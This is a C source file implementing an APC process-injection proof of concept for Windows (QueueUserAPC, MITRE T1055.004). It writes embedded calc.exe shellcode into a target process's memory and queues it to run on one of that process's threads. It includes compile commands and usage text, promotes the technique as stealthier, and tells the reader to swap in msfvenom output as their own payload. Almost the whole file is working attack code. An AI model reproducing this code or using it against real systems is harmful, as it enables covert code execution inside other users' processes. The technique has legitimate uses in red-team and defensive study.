/*
 * APC Injection — QueueUserAPC
 *
 * Technique: Queue an Asynchronous Procedure Call (APC) into a thread of
 *            the target process. The shellcode runs when the thread enters
 *            an alertable wait state.
 *
 * MITRE ATT&CK: T1055.004 — Asynchronous Procedure Call
 *
 * Advantages over CreateRemoteThread:
 *   - Stealthier: no new thread created
 *   - Works with suspended/alertable threads
 *   - Used in early-bird injection (target in suspended state)
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o apc_inject.exe apc_injection.c
 *   cl apc_injection.c /Fe:apc_inject.exe
 *
 * Usage:
 *   apc_inject.exe <PID>
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// calc.exe shellcode — replace with msfvenom output for your payload
unsigned char shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00"
    "\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
    "\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
    "\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
    "\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
    "\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41"
    "\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
    "\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff"
    "\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01"
    "\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2"
    "\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06"
    "\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59"
    "\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";


DWORD FindAlertableThread(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);

    DWORD threadId = 0;
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                threadId = te.th32ThreadID;
                break; // Take first thread
            }
        } while (Thread32Next(hSnap, &te));
    }

    CloseHandle(hSnap);
    return threadId;
}


int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("APC Injection PoC\n");
        printf("Usage: %s <PID>\n", argv[0]);
        printf("Tip: Target a process with alertable threads (e.g., explorer.exe)\n");
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    printf("[*] APC Injection PoC\n");
    printf("[*] Target PID: %lu\n", pid);

    // Step 1: Open process
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed (error %lu)\n", GetLastError());
        return 1;
    }

    // Step 2: Allocate + write shellcode
    LPVOID remoteAddr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteAddr) {
        printf("[-] VirtualAllocEx failed\n");
        CloseHandle(hProcess);
        return 1;
    }

    SIZE_T written;
    WriteProcessMemory(hProcess, remoteAddr, shellcode, sizeof(shellcode), &written);
    printf("[+] Shellcode written at 0x%p (%zu bytes)\n", remoteAddr, written);

    // Step 3: Find a thread and queue APC
    DWORD tid = FindAlertableThread(pid);
    if (!tid) {
        printf("[-] No thread found in target process\n");
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Target thread ID: %lu\n", tid);

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
    if (!hThread) {
        printf("[-] OpenThread failed (error %lu)\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // Step 4: Queue the APC
    DWORD result = QueueUserAPC((PAPCFUNC)remoteAddr, hThread, 0);
    if (result) {
        printf("[+] APC queued! Shellcode will execute when thread enters alertable state.\n");
        printf("[*] Note: If target thread is not in alertable wait, it may not fire immediately.\n");
    } else {
        printf("[-] QueueUserAPC failed (error %lu)\n", GetLastError());
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
